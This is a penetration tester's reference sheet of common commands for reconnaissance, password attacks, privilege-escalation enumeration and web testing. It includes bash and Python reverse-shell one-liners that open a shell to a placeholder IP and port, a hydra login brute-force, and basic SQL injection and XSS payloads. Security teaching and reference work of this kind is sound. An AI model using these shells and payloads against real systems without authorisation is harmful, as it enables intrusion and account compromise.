# Security Tools & Scripts

Collection of tools and scripts developed or commonly used during penetration testing.

## Custom Scripts
*Coming soon - Will include automation scripts for common tasks*

## Tool References

### Reconnaissance
```bash
# Nmap common scans
nmap -sC -sV -oN initial_scan.txt [target]
nmap -p- -T4 -oN all_ports.txt [target]
nmap -sU --top-ports 100 -oN udp_scan.txt [target]

# Directory enumeration
gobuster dir -u http://[target] -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://[target] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Exploitation
```bash
# Reverse shells
bash -i >& /dev/tcp/[ip]/[port] 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip]",[port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Shell stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
```

### Password Attacks
```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m [mode] hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM

# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt [target] http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

### Privilege Escalation
```bash
# Linux enumeration
sudo -l
find / -perm -u=s -type f 2>/dev/null  # SUID binaries
getcap -r / 2>/dev/null  # Capabilities
ss -tulpn  # Network connections

# Windows enumeration
whoami /priv
net user
systeminfo
```

### Web Application Testing
```bash
# SQL Injection basic tests
' OR '1'='1
admin' --
' UNION SELECT NULL,NULL,NULL--

# XSS basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

## Useful Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payload collection
- [PentestMonkey](https://pentestmonkey.net/) - Reverse shell cheatsheet
- [HackTricks](https://book.hacktricks.xyz/) - Penetration testing methodology